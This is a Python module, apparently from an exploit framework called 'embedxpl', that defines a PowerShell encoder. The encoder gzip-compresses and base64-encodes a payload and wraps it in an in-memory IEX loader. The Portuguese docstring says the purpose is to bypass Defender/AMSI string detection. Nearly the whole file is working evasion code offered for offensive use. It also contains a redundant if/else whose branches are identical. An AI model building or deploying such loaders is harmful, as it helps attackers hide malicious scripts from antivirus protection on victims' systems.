"""PowerShell GZip + base64 encoder.

Comprime o script PS1 com GZip e decodifica em runtime.
Bypassa filtros de string mais avançados do Defender/AMSI
(o script nunca aparece em texto claro na memória... até ser descomprimido).
"""

import base64
import gzip
from embedxpl.core.exploit.encoder import BaseEncoder


class Encoder(BaseEncoder):
    name        = "powershell/ps_compress"
    description = "PowerShell GZip+base64 compression encoder — evades string detection"
    arch        = ["x64", "x86"]
    platform    = ["windows"]
    evasion_score = 6

    options = {}

    def encode(self, payload: bytes) -> bytes:
        if not payload.decode(errors="replace").strip().startswith("$") and payload[0] > 0x20:
            ps_payload = payload.decode(errors="replace")
        else:
            ps_payload = payload.decode(errors="replace")

        compressed = gzip.compress(ps_payload.encode("utf-16-le"))
        b64 = base64.b64encode(compressed).decode()

        loader = (
            f'$data=[Convert]::FromBase64String("{b64}");'
            '$ms=New-Object IO.MemoryStream(,$data);'
            '$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);'
            '$sr=New-Object IO.StreamReader($gs,[Text.Encoding]::Unicode);'
            'IEX $sr.ReadToEnd()'
        )
        return loader.encode()
